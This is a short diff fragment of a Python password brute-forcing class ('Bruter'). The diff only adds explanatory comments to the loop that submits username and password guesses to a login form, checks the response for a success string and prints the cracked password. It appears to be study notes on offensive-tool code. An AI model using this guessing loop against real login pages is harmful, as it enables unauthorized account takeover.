@@ -93,13 +93,13 @@ class Bruter:
             # Sends a POST request to the same URL.
             # The server response is stored in `resp1`:          
             resp1 = session.post(self.url, data=params)         # data=params means the dictionary is sent as form data like a normal HTML form in a browser: encoding with 'application/x-www-form-urlencoded': log=admin&pwd=1234.           
-            if SUCCESS in resp1.content.decode():
-                self.found = True
+            if SUCCESS in resp1.content.decode():               # Takes the response body bytes: `resp1.content`. Decodes them into text with `.decode()`. Checks whether the `SUCCESS` string appears inside that text.
+                self.found = True                               # Sets the object-wide flag to True. Other threads will eventually stop because their loop checks `not self.found`.
                 print(f"\nBruteforcing successful.")
                 print(f"Username is {self.username}")
                 print(f"Password is {passwd}\n")
                 # print("Username is %s" % self.username) — Old formatting. 
-                # print("Password is %s\n" % passwd)
+                # print("Password is %s\n" % passwd) — Still works, but old. 
                 print('Done: now cleaning up other threads...')
 
 if __name__ == '__main__':
